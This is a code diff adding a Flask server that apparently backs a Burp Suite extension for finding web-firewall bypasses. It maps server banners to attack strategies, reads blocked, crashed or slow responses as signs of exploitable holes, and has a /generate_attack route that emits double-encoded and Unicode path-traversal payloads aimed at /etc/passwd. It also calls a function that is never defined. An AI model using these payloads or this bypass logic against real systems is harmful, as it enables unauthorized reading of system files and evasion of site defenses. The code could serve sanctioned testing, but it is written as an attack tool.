@@ -1,0 +1,163 @@
+from flask import Flask, request, jsonify
+from model.training import train_model
+from tests.test_generator import generate_test_case
+from features.feature_extraction import extract_features
+from features.firewall_classifier import classify_firewall_behavior
+from utils.utils import load_request_data, log_test_case
+import random
+import time
+
+app = Flask(__name__)
+# A library of "Bypass Techniques" for the AI to choose from
+encodings = ["none", "url_double", "unicode", "null_byte"]
+# Train the model once when the server starts
+print("Training model... please wait.")
+model = train_model()
+# ADD THIS NEW ROUTE BELOW:
+# mapping Server types to known "Weak Points"
+STRATEGY_MAP = {
+    "varnish": "HTTP_REQUEST_SMUGGLING",
+    "nginx": "PATH_TRAVERSAL_SEMICOLON",
+    "apache": "HTACCESS_BYPASS",
+    "microsoft-iis": "SHORT_FILE_NAME_LEAK",
+    "cloudflare": "WAF_BYPASS_UNICODE"
+}
+
+def get_attack_strategy(headers):
+    # Search headers for clues
+    server = headers.get('Server', '').lower()
+    powered_by = headers.get('X-Powered-By', '').lower()
+    
+    for key in STRATEGY_MAP:
+        if key in server or key in powered_by:
+            return STRATEGY_MAP[key]
+    
+    return "GENERIC_FUZZING"
+@app.route('/analyze_response', methods=['POST'])
+def analyze_response():
+    data = request.json
+    status = data.get('status_code')
+    latency = data.get('latency_ms')
+    server = data.get('server_header', 'Unknown')
+    payload = data.get('payload', '')
+
+    # SMART LOGIC:
+    if status == 403:
+        # The AI learns: "This payload is blocked by this specific Firewall"
+        print(f"[!] BLOCKED: {server} rejected {payload}")
+        update_waf_rules(server, payload, blocked=True)
+    
+    elif status == 500:
+        # The AI learns: "This payload caused a crash (Potential SQLi/Buffer Overflow)"
+        print(f"[*] CRASH DETECTED: {server} errored on {payload}")
+    
+    elif status == 200 and latency > 5000:
+        # The AI learns: "This payload caused a time-delay (Potential Blind Exploit)"
+        print(f"[+] BYPASS: Time-based vulnerability found on {server}")
+
+    return jsonify({"status": "processed"})
+@app.route('/train_result', methods=['POST'])
+def train_result():
+    data = request.json
+    
+    # New metrics to track
+    status_code = data.get('status_code')      # e.g., 200, 403, 500
+    latency = data.get('latency_ms')           # e.g., 5005ms
+    server_info = data.get('server_version')   # e.g., "Nginx/1.18.0"
+    
+    # AI Logic: 
+    # If Status == 200 AND Latency > 5000: High probability of Time-Based vulnerability.
+    # If Status == 403: The Firewall (WAF) is active and blocked this specific payload.
+    
+    if status_code == 403:
+        print(f"[-] Blocked by {server_info}. Need to mutate payload.")
+    elif status_code == 200 and latency > 5000:
+        print(f"[+] SUCCESS: Potential Time-Based Bypass found on {server_info}!")
+
+    return jsonify({"status": "learning_updated"}), 200
+@app.route('/train', methods=['POST'])
+def train():
+    try:
+        data = request.get_json()
+        
+        # If data is a list (Bulk Training), loop through it
+        if isinstance(data, list):
+            for entry in data:
+                process_entry(entry)
+            return jsonify({"status": "success", "message": f"Processed {len(data)} items"}), 200
+        
+        # If data is a single dictionary
+        else:
+            process_entry(data)
+            return jsonify({"status": "success", "message": "Training data received"}), 200
+
+    except Exception as e:
+        return jsonify({"status": "error", "message": str(e)}), 500
+
+def process_entry(entry):
+    url = entry.get('url')
+    label = entry.get('label')
+    print(f"--- TRAINING RECEIVED ---")
+    print(f"URL: {url} | LABEL: {label}")
+
+@app.route('/analyze', methods=['POST'])
+def analyze_request():
+    try:
+        # 1. Get the JSON data sent from Burp Suite
+        data = request.get_json()
+        if not data:
+            return jsonify({"error": "No data received"}), 400
+
+        print(f"Received request from Burp: {data.get('url', 'Unknown URL')}")
+
+        # 2. Extract components (matching your Java JsonBuilder structure)
+        sample_request = {
+            "url": data.get("url"),
+            "method": data.get("method"),
+            "headers": data.get("headers"),
+            "body": data.get("body")
+        }
+        
+        # Simulated firewall response (or you can pass real ones if captured)
+        firewall_response = {"blocked": True, "error_code": "FW_1023", "category": "normalization"}
+
+        # 3. Run your AI Logic
+        features = extract_features(sample_request, firewall_response)
+        firewall_behavior = classify_firewall_behavior(features)
+        
+        test_cases = generate_test_case(features)
+        for test_case in test_cases:
+            log_test_case(test_case)
+
+        # 4. Respond back to Burp
+        return jsonify({
+            "status": "success",
+            "behavior_detected": firewall_behavior,
+            "test_cases_generated": len(test_cases)
+        }), 200
+
+    except Exception as e:
+        print(f"Error processing request: {str(e)}")
+        return jsonify({"error": str(e)}), 500
+@app.route('/generate_attack', methods=['GET'])
+def generate_attack():
+    target_path = "/etc/passwd"
+    
+    # The AI "decides" which bypass to try
+    technique = random.choice(encodings)
+    
+    if technique == "url_double":
+        payload = "%252e%252e%252f" + target_path # Double encoded ../
+    elif technique == "unicode":
+        payload = "..%u2215" + target_path
+    else:
+        payload = "../../../" + target_path
+
+    return jsonify({
+        "technique": technique,
+        "payload": payload,
+        "goal": "LFI / Path Traversal"
+    })
+if __name__ == "__main__":
+    # Listen on port 5000 as requested
+    app.run(host='127.0.0.1', port=5000, debug=True)
